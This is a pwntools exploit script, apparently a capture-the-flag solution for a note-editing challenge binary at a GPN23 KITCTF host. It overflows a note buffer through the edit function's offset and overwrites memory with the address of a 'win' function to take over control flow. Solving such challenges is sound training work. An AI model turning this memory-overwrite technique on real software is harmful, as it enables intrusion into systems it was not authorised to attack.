#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe
#context.log_level = 'debug'

gdb_script = '''
    b *append
    b *append+159
    b *edit
    b *edit+379
    b *menu
    c
'''
def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdb_script)

    else:
        r = remote("ironville-of-nuclear-grade-prosperity.gpn23.ctf.kitctf.de", "443", ssl=True)

    return r


def main():
    r = conn()

    r.recvuntil(b"Choose your action:")
    r.sendline(b"3")

    r.recvuntil(b"Append something to your note (1024 bytes left):")
    r.sendline(b"A"*1019)

    r.recvuntil(b"Choose your action:")
    r.sendline(b"4")

    r.recvuntil(b"Give me an offset where you want to start editing:")
    r.sendline(b"1020")

    r.recvuntil(b"How many bytes do you want to overwrite:")
    r.sendline(b"4")

    r.sendline(b"AAAA")
    
    r.recvuntil(b"Choose your action:")
    r.sendline(b"4")

    r.recvuntil(b"Give me an offset where you want to start editing:")
    r.sendline(b"62")

    r.recvuntil(b"How many bytes do you want to overwrite:")
    r.sendline(b"4")

    r.sendline(p64(exe.sym.win))

    

    r.interactive()


if __name__ == "__main__":
    main()
